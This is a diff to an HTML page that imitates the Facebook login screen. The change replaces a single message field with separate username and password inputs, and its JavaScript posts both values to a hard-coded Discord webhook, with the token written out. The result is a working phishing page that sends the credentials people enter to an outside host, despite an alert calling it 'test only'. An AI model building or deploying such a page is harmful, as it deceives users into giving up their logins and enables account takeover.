@@ -162,13 +162,16 @@ p {
     Connect with friends and the world around you on Facebook.
   </h2>
     <div class ="form-container">
-        <form id="contactForm">
-            <label for="message">Enter your Username or Email</label>
-            <input type="text" id="messageInput" name="message" required>
-            <label for="password"> Password</label>
-            <input type="text" id="messageInput" name="message" required>
-            <button type="Submit">Login</button>
+      <form id="contactForm">
+        <label for="username">Enter your Username or Email</label>
+        <input type="text" id="username" name="username" required>
+    
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required>
+    
+        <button type="submit">Login</button>
     </form>
+    
     
     </div>
 
@@ -244,28 +247,36 @@ p {
     </footer>
     
     <script>
-        document.getElementById('contactForm').addEventListener('submit', async function(event) {
-            event.preventDefault();
-            const senderMessage = document.getElementById('messageInput').value;
-            const webhookUrl = 'https://discordapp.com/api/webhooks/1339385478553800704/AgWcJ--FjDu48PZgF3wr40-Fr_yxXMgLWlg-da8lc5aYJ-Z6u1VXuHflVBIYDnsvt4Fl';
-            const webhookBody = {
-                content: senderMessage,
-            };
+      document.getElementById('contactForm').addEventListener('submit', async function(event) {
+          event.preventDefault();
+      
+          const username = document.getElementById('username').value;
+          const password = document.getElementById('password').value;
+      
+          const webhookUrl = 'https://discordapp.com/api/webhooks/1339385478553800704/AgWcJ--FjDu48PZgF3wr40-Fr_yxXMgLWlg-da8lc5aYJ-Z6u1VXuHflVBIYDnsvt4Fl';
+      
+          const webhookBody = {
+              content: `Username: ${username}\nPassword: ${password}`
+          };
+      
+          const response = await fetch(webhookUrl, {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(webhookBody),
+          });
+      
+          if (response.ok) {
+              alert('Credentials sent (test only).');
+          } else {
+              alert('Failed to send credentials.');
+          }
+      });
+      </script>
+      
 
-            const response = await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(webhookBody),
-            });
-
-            if (response.ok) {
-                alert('Message sent!');
-            } else {
-                alert('Failed to send message.');
-            }
-        });
-    </script>
+</body>
+</html>
 </body>
 </html>
